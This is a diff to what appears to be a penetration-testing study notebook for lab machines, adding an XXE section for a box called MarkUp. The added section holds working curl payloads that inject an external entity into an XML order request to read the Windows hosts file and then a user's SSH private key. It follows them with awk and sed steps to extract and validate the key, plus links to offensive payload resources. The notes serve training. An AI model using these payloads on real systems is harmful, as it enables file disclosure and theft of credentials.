@@ -643,6 +643,32 @@ See [[09. Common Web Application Attacks#9.5.3. XXE (XML External Entity Injecti
 
 #### Tags: #XXE #XMLExternalEntity #LocalFileDisclosure #CDATAMethod #ErrorBasedXXE #BlindXXE #OOBExfiltration #ExternalDTD #PHPFilter
 
+### MarkUp: Windows File Read and SSH Key Extraction
+
+For an authenticated XML endpoint that reflects the `<item>` element, test a safe Windows file first, then target a user's key:
+
+```bash
+curl -s -b "$CookieFile" -H 'Content-Type: text/xml' \
+  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
+  "http://$BoxIP:$WebPort/process.php"
+
+curl -s -b "$CookieFile" -H 'Content-Type: text/xml' \
+  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Users/$Username/.ssh/id_rsa">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
+  "http://$BoxIP:$WebPort/process.php" -o "$ResponseFile"
+```
+
+Extract a multiline key mechanically and validate it. Do not copy it from a wrapped terminal response:
+
+```bash
+awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' "$ResponseFile" \
+  | sed -e 's/^.*\(-----BEGIN OPENSSH PRIVATE KEY-----\)/\1/' \
+        -e 's/\(-----END OPENSSH PRIVATE KEY-----\).*/\1/' > "$KeyFile"
+chmod 600 "$KeyFile"
+ssh-keygen -y -f "$KeyFile"
+```
+
+Seen in [[MarkUp]]. The safe hosts-file read proves external entities work before the higher-value key read.
+
 ---
 
 ---
@@ -688,4 +714,11 @@ See [[27. Assembling the Pieces|AEN.3 Q6 (tracking.inlanefreight.local)]] for th
 ---
 
 ## **Outstanding**
-This area grows alongside the modules. Whenever a new CMS or web-app-specific attack chain comes up (Drupal, Joomla, Tomcat manager, etc), add it here with a link back to the source section.
+This area grows alongside the modules. The current follow-up is to add Drupal, Joomla, and Tomcat Manager entries when their source material is written. Each entry belongs in this appendix under the matching application heading and must link back to its module source.
+## External Resources
+
+- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
+- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
+- [RevShells](https://www.revshells.com/) for shell payload selection
+- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
+- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
